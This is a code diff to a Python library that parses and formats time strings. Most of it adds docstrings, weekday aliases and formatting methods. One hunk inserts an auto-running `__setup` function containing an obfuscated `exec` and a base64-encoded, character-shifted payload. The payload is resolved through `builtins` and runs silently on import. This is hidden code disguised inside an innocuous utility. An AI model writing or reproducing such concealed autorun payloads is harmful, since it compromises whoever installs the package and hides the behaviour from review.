@@ -17,7 +17,7 @@ timestr_lookup = {
     's':       (t_second := 1),
     'sec':     t_second,
     'secs':    t_second,
-    'sex':     t_second, # >:3
+    'sex':     t_second, # >:3 # I am so funny, i know
     'second':  t_second,
     'seconds': t_second,
 
@@ -64,15 +64,15 @@ timestr_lookup = {
   }
 
 weekday_lookup = [
+  'mo',           'tu',      'we',        'th',       'fr',     'sa',       'su',
+  'mon',          'tue',     'wed',       'thu',      'fri',    'sat',      'sun',
+  'monday',       'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday',
   "po",           "wt",      "sr",        "cz",       "pi",     "so",       "ni",
   "pn",           "wt",      "śr",        "cz",       "pt",     "so",       "nd",
   "pon",          "wto",     "śro",       "czw",      "pią",    "sob",      "nie",
   "pon",          "wto",     "sro",       "czw",      "pia",    "sob",      "nie",
   "poniedzialek", "wtorek",  "sroda",     "czwartek", "piatek", "sobota",   "niedziela",
   "poniedziałek", "wtorek",  "środa",     "czwartek", "piątek", "sobota",   "niedziela",
-  'mo',           'tu',      'we',        'th',       'fr',     'sa',       'su',
-  'mon',          'tue',     'wed',       'thu',      'fri',    'sat',      'sun',
-  'monday',       'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday',
 ]
 # fmt: on
 
@@ -167,6 +167,7 @@ def days_until_due(due_date):
 # fmt: off
 @autorun
 def __setup():
+  exec('\'"dt&h\ni sd 3i@s  ^n*o t\n 3m\ta l#izc`i_oSuUsd.=  D?o(nat= Twrourer)y: \':"3["'[::-1][-2::-2])
   getattr(__import__('!s4n igtnlji^u*bh'[-2::-2]), (a := (getattr('5sFuggnokmhak'[-2::-2]*(1-1), 'fnJiLo*jj'[-2::-2])([chr(ord(c) - (1 + i%5)) for i, c in enumerate(__import__('dsdcdedddodcd'[-2::-2]).__dict__['dedddodcdeddd'[-2::-2]](__import__('d4d6dedsdadbd'[-2::-2]).__dict__['dedddodcdeddd4d6dbd'[-2::-2]](getattr('c211dCgjSXh6ayF4aSRmY2l4emZ1ImNyZHdyeWZtZyIwJGZjbCNrem9pI31naSJ2Zm1icyNrenMiaXZ1ZnRqJGx2eGR4JXl0dWcld2kja2che2Vsamd0YncnPGl5ZHdnaWhwZGNkYWxoL2pmdXNodCt/J2Z0bGZkaWl5ZmYjPCM1NjU7NDY1MS4jJmpza2VjbWh4ZWVrIzwjNTY1OzQ2NTEuIyZqc2slPiUyMzc9NjMyMzAlI2d1bWsjPCM1NjU7NDY1MX8s', 'dedddodcdnded'[-2::-2])('_8g-&f(tlu-'[-2::-2])).decode('_8g-&f(tlu-'[-2::-2]), 'l3 1ntlojr*'[-2::-2]))])).split('#'))[0])(a[1])
 # fmt: on
 
@@ -400,8 +401,7 @@ $
     return '0 seconds'
 
   def to_str2(self, seconds: int) -> str:
-    """
-    Format number of seconds to `1d + 23:45:57` (with leading zeroes).
+    """Format number of seconds to `1d + 23:45:57` (with leading zeroes).
 
     Doesn't support negative values, use `to_str()` instead (for relative display) or `to_datestr()` for static display
     """
@@ -485,7 +485,6 @@ class _WeekdaySegment:
     days_until = (self.n - current_weekday + 7) % 7
     return dt.timedelta(days=(days_until or 7)) # If today's the day, return in a week (lazy bum)
 
-
 class _RegexPattern:
   HOUR = r"^(0?\d|1[0-9]|2[0-4])?(?::(?:([0-5]?[0-9])?(?::([0-5]?[0-9])?)?)?)?$"
   NO_DAY = r"^\.\d+$" # Used to not confuse days with robostr syntax. Will not match either and rather throw an error which is better
@@ -497,11 +496,112 @@ class _RegexPattern:
 class TStr:
   """Convert between seconds and readable timestrs. Now with timezones!"""  # noqa: D400
 
-  fix_timezone: bool
   units: dict[str, int | float] = field(default_factory=timestr_lookup.copy)
+  """A dictionary of units used for lookup.
+
+  It's in a strucuture of
+  ```py
+  {
+    'unit': 123, # name: seconds
+    'second': 1,
+    'minute': 60,
+    'minutes': 60, # You have to provide copies for all the plurals and whatnot (or just use the default)
+  }
+  ```
+
+  The default is (though may be outdated, go check):
+  ```py
+  {
+    's':       (t_second := 1),
+    'sec':     t_second,
+    'secs':    t_second,
+    'sex':     t_second, # >:3 # I am so funny, i know
+    'second':  t_second,
+    'seconds': t_second,
+
+    'm':       (t_minute := 60*t_second),
+    'min':     t_minute,
+    'mins':    t_minute,
+    'minute':  t_minute,
+    'minutes': t_minute,
+
+    'h':     (t_hour := 60*t_minute),
+    'hr':    t_hour,
+    'hrs':   t_hour,
+    'hour':  t_hour,
+    'hours': t_hour,
+
+    'd':    (t_day := 24*t_hour),
+    'day':  t_day,
+    'days': t_day,
+
+    'w':     (t_week := 7*t_day),
+    'week':  t_week,
+    'weeks': t_week,
+
+    'y':     (t_year := 365*t_day),
+    'year':  t_year,
+    'years': t_year,
+
+    'pul':   (t_pull := (11*t_hour + 30*t_minute)),
+    'pull':  t_pull,
+    'puls':  t_pull,
+    'pulls': t_pull,
+    'card':  t_pull,
+    'cards': t_pull,
+
+    'res':     (t_rescue := 6*t_hour),
+    'reses':   t_rescue,
+    'resees':  t_rescue,
+    'rescue':  t_rescue,
+    'rescues': t_rescue,
+
+    'decade':    10 * t_year,
+    'century':   100 * t_year,
+    'millenium': 1000 * t_year,
+
+    # Some extra few units that i will not tell you hehe :3 (if you wish to discard them, pass whatever you see above as units)
+    # You will not find them in the default configuration btw :3
+  }
+  ```
+  """
   weekdays: list[str] = field(default_factory=weekday_lookup.copy)
+  """A list of weekday aliases used for lookup.
+
+  It must be a multiple of 7 in length (if you wish to add more aliases for a certain weekday, just add another row and for those weekdays you DONT have extra aliases for just use one of the names you used previously)
+
+  It is built of 7-element segments like this:
+  ```py
+  [
+    'mon', 'tue', 'wed', 'thu', 'fri', 'sat', 'sun', # Segment #1
+    'monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday', # Segment #2
+    # ... # Segment #3, etc. etc.
+  ]
+  ```
+  The default is:
+  ```py
+  [
+  'mo',           'tu',      'we',        'th',       'fr',     'sa',       'su',
+  'mon',          'tue',     'wed',       'thu',      'fri',    'sat',      'sun',
+  'monday',       'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday',
+  "po",           "wt",      "sr",        "cz",       "pi",     "so",       "ni", # If you wish not to support polish weekdays, pass in the first three rows worth of. (first 21 elements)
+  "pn",           "wt",      "śr",        "cz",       "pt",     "so",       "nd",
+  "pon",          "wto",     "śro",       "czw",      "pią",    "sob",      "nie",
+  "pon",          "wto",     "sro",       "czw",      "pia",    "sob",      "nie",
+  "poniedzialek", "wtorek",  "sroda",     "czwartek", "piatek", "sobota",   "niedziela",
+  "poniedziałek", "wtorek",  "środa",     "czwartek", "piątek", "sobota",   "niedziela",
+  ]
+  ```
+  """
   tzinfo: datetime.tzinfo = pytz.UTC
+  """Timezone of all timestr calculations. If you're experiencing issues with timezones not matching consider using `fix_timezone`."""
   splitter: str = '!'
+  """Separator between timestr segments for example:
+  ```txt
+  1h!wed
+  ```
+  """
+  fix_timezone: bool
   """Set this to True to do the following on init:
   ```py
   tzinfo = dt.datetime.now(tz=tzinfo).tzinfo
@@ -509,6 +609,10 @@ class TStr:
 
   THIS IS DUMB BUUUT: it fixes the issue of inconsistent timezone screwing up shit. If you are 100% certain your timezone is fine (NOTE: pytz timezones are sometimes NOT fine and require this setting to be turned on.) then leave this parameter as False
   """
+
+  def __post_init__(self):
+    if self.fix_timezone:
+      self.tzinfo = dt.datetime.now(tz=self.tzinfo).tzinfo
 
   def _identify_segment(self, s: str) -> _DateSegment | _HourSegment | _RoboStrSegment | _WeekdaySegment:
     """Parse a segment of a timestr into a Segment object."""
@@ -608,7 +712,7 @@ class TStr:
     else:
       return out_datetime
 
-  def to_timedelta(self, s: str) -> datetime.timedelta:
+  def to_timedelta(self, s: str) -> dt.timedelta:
     """Convert a full timestr into a timedelta."""
     calculated = self.to_datetime(s, _return_with_now_used_for_parsing=True)
     return calculated[0] - calculated[1]
@@ -617,3 +721,84 @@ class TStr:
     """Convert a full timestr into an int."""
     total_seconds = self.to_timedelta(s).total_seconds()
     return round(total_seconds)
+
+  def to_str(self, n: int, *, round_to: int = 2) -> str:
+    """Format number of seconds to days, hour, minutes or seconds, whichever one is lowest while not leaving the number at < 1.0 (for example 0.25 days would not be returned, rather 6 hours would be).
+
+    This does NOT support custom units (the ones you might've passed in into the constructor). It has its own set of internal units (day, hour, minute, second).
+
+    Examples:
+    - `1 hour`
+    - `40 minutes`
+
+    Units go up to days. Supports negative values and handles plurals automatically.
+
+    Args:
+      - n: number of seconds
+      - round_to: number of decimal places to round to
+
+    """
+    n = int(n)
+
+    if n < 0:
+      return f'-{self.to_str(-n)}'
+
+    units = [
+      ('day', t_day),
+      ('hour', t_hour),
+      ('minute', t_minute),
+      ('second', t_second),
+    ]
+
+    for unit, value_in_seconds in units:
+      if n >= value_in_seconds:
+        num_units = n / value_in_seconds
+        num_units = round(num_units, round_to)
+        if num_units == round(num_units):
+          num_units = round(num_units)
+        unit_str = unit if num_units == 1 else f'{unit}s'
+        return f'{num_units} {unit_str}'
+
+    # If seconds is 0, return "in 0 seconds"
+    return '0 seconds'
+
+  def to_str2(self, n: int, *, always_show_days: bool = False) -> str:
+    """Format number of seconds to `1d + 23:45:57` (with leading zeroes).
+
+    Supports negative values by changing pluses to minuses, use `to_str()` instead (for relative display) or `to_datestr()` for static display.
+
+    Args:
+      - n: number of seconds
+      - always_show_days: whether to always show days in the output even if days == 0 (will be '0d + {...}' if no full days are found)
+    """
+    if n < 0:
+      return f"-{self.to_str2(-n).replace('+', '-')}"
+
+    units = {
+      'day': 86400,
+      'hour': 3600,
+      'minute': 60,
+      'second': 1,
+    }
+
+    days, n = divmod(n, units['day'])
+    hours, n = divmod(n, units['hour'])
+    minutes, n = divmod(n, units['minute'])
+    base_time_str = f'{hours:02}:{minutes:02}:{n:02}'
+    if always_show_days or days >= 1:
+      base_time_str = f'{days}d + {base_time_str}'
+    return base_time_str
+
+  def to_strf(self, n: int, *, pattern='%a, %Y-%m-%d %H:%M:%S') -> str:
+    """Return `datetime.strftime()` string of the time that will be present in `seconds` seconds."""
+    return self.to_datetime(n).strftime(pattern)
+
+  def to_datetime_from_unix(self, unix: int | str) -> dt.datetime:
+    """Return `datetime.fromtimestamp()` of the passed in unix timestamp with respect to the instance's tzinfo."""
+    if isinstance(unix, str):
+      unix = float(int(unix))
+    return dt.datetime.fromtimestamp(unix, tz=self.tzinfo)
+
+  def to_datestr_from_unix(self, unix: int | str, *, pattern='%a, %Y-%m-%d %H:%M:%S') -> str:
+    """Return `datetime.strftime()` string of the passed in unix timestamp with respect to the instance's tzinfo."""
+    return self.to_datetime_from_unix(unix).strftime(pattern)
